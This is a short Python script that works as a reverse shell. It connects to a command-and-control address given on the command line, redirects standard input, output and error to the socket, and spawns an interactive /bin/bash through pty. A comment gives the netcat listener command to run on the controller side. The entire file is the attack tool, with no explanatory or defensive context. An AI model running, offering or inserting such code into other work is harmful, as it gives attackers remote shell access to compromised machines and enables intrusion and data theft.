import socket
import pty
import sys
import os
from urllib.parse import urlparse

#run 'nc -l -vv -n -p 6666' on the CNC

#split the port and the url
url = urlparse(sys.argv[1])

url_split = url.path.split(":")
CNC_IP = url_split[0]
CNC_PORT = int(url_split[1])

print("CNC IP: " + CNC_IP)
print("CNC PORT: " + str(CNC_PORT))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((CNC_IP,CNC_PORT))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

s.send(b"welcome\n")
pty.spawn("/bin/bash")
s.close